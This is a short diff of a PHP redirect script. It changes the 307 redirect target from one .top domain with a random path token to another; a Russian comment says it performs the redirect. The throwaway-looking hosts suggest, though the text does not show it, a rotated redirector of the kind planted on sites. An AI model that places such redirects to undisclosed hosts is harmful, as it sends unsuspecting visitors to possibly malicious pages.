@@ -3,6 +3,6 @@
 http_response_code(307);
 
 // Выполняем редирект на нужный URL
-header('Location: https://serversaviran.top/yTqhY3');
+header('Location: https://swiftlabs.top/M68P7y');
 exit();
 ?>
